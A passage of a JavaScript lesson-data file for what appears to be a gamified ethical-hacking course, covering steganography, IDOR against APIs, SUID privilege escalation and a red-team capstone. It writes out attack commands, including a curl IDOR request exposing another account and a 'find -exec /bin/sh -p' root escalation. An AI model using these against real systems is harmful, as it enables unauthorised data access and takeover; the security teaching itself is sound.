hints:["Binwalk carves out embedded files hidden inside carrier archive blocks.","Steghide injects text payloads directly inside image color arrays securely."],
quiz:[{q:"What does steganography do?",opts:["Crashes servers","Hides data inside normal files like images","Scans open ports","Encrypts hard drives"],a:1},{q:"Which tool reads file metadata like camera specs and GPS tracks?",opts:["Sqlmap","Exiftool","Hydra","Nmap"],a:1}],
assignment:{title:"CARVING EXTRACT FORENSICS",tasks:["Analyze target test image files via exiftool","Check for secondary inner file structures"],submit:"Provide geolocation data strings discovered inside metadata scopes."}},

{id:28,title:"API Security Vulnerabilities",emoji:"🔌",subtitle:"Intercept, break, and abuse API logic gates.",type:"web",phase:3,month:3,points:110,duration_mins:55,
intro:"Modern applications run on hidden APIs. If an API doesn't check authorization headers on every request, anyone can modify or read records by changing IDs.",
sections:[
{title:"Exploiting Weak Endpoint Paths",steps:["Trace communication API routes via proxy monitors","Alter index targets within request payloads (/api/v1/user/1001 -> /api/v1/user/1002)"],
cmd:[{t:"cmd",v:"curl -X GET https://target.com/api/v1/profile/1002"},{t:"out",v:"{\"id\":1002,\"username\":\"victim_account\",\"balance\":50000}"}],warning:"Validate identity object token bindings on every API gateway routing switch."}
],
hints:["This vulnerability is called IDOR (Insecure Direct Object Reference).","Always use secure UUID formats instead of incremental counter indexes for resource routing parameters."],
quiz:[{q:"What does IDOR stand for?",opts:["Internal Data Object Route","Insecure Direct Object Reference","Integrated Device Operational Rules","Input Data Overwrite Registry"],a:1},{q:"How to secure API resource endpoints?",opts:["Hide the API URL","Enforce rigorous authentication checks on every single resource request","Use dark styles","Limit character counts"],a:1}],
assignment:{title:"OBJECT REFERENCE LOCKS",tasks:["Inspect exposed API paths on target simulations","Enforce user ownership parameter check loops"],submit:"Provide backend tracking code snippet validating user ownership tags."}},

{id:29,title:"Privilege Escalation Loops",emoji:"👑",subtitle:"Scale limited terminal access up to Root.",type:"system",phase:3,month:3,points:140,duration_mins:80,
intro:"Landing a shell gives you a limited user footprint. To control the target, you must find system vulnerabilities to escalate your access to root.",
sections:[
{title:"Hunting SUID Misconfigurations",steps:["Scan system profiles for binaries running with root permissions (SUID)","Exploit weak system binary functions to escape into root shells"],
cmd:[{t:"cmd",v:"find / -perm -4000 -type f 2>/dev/null"},{t:"out",v:"/usr/bin/find"},{t:"cmd",v:"find . -exec /bin/sh -p \\; -quit"},{t:"out",v:"whoami\nroot"}],warning:"Audit sudo configurations and SUID file permissions meticulously."}
],
hints:["GTFOBins records simple command methods to escape restricted Linux environment limits.","Misconfigured crontabs running scripts with root privileges offer scaling pathways."],
quiz:[{q:"What user account has complete administrative power over Linux systems?",opts:["guest","admin","root","system"],a:2},{q:"What repository documents commands to escape limited Linux binary environments?",opts:["Wikipedia","GTFOBins","ExploitDB","GitHub Docs"],a:1}],
assignment:{title:"SUID REFUGE ANALYSIS",tasks:["Audit file execution properties on sandbox installations","Isolate SUID vulnerabilities"],submit:"Provide the command that scales access when weak binaries are exploited."}},

{id:30,title:"The Red Team Capstone Engagement",emoji:"🩸",subtitle:"Execute full chains from recon up to root.",type:"system",phase:3,month:3,points:250,duration_mins:180,
intro:"Your graduation exercise. You are given a target domain scope. You must footprint hosts, dump data pools, land shells, and elevate access to root.",
sections:[
{title:"Consolidated Tactical Operational Cycles",steps:["Run comprehensive network reconnaissance","Exploit exposed logical vectors","Capture final evaluation flags"],
cmd:[{t:"c",v:"1. Network Footprint Target Mapping Complete"},{t:"c",v:"2. Parameter Vulnerability Point Exposed"},{t:"c",v:"3. Outbound Shell Pipeline Established"},{t:"c",v:"4. SUID Configuration Mapped"},{t:"c",v:"5. Local Privilege Escalation Matrix Executed"},{t:"ok",v:"GRADUATION PROTOCOLS ACCOMPLISHED — OPERATIVE REGISTERED"}],warning:"Document every phase step for peer evaluation logs."}
],
hints:["Review notes compiled across all 29 modules. Trust your methodology.","Take breaks during the three-hour exercise window; structure your notes cleanly."],
quiz:[{q:"The initial stage of a structured security assessment is?",opts:["Exploitation","Reporting","Passive Reconnaissance","Privilege Escalation"],a:2},{q:"Once an exploit succeeds, what is the immediate critical step?",opts:["Clear logs","Keep it secret","Document facts for deep root-cause reporting","Reboot host"],a:2}],
assignment:{title:"FINAL GRADUATION REPORT",tasks:["Compile your consolidated tactical test logs","Document every vulnerability found with its CVSS level","Provide full remediation notes for developers","Include terminal shell output logs"],submit:"Submit your complete professional reporting package to receive your graduation rank."}}
];

function getLessonById(id){return LESSONS.find(l=>l.id===id)||null;}
function getLessonsByPhase(p){return LESSONS.filter(l=>l.phase===p);}
function getLessonsByMonth(m){return LESSONS.filter(l=>l.month===m);}
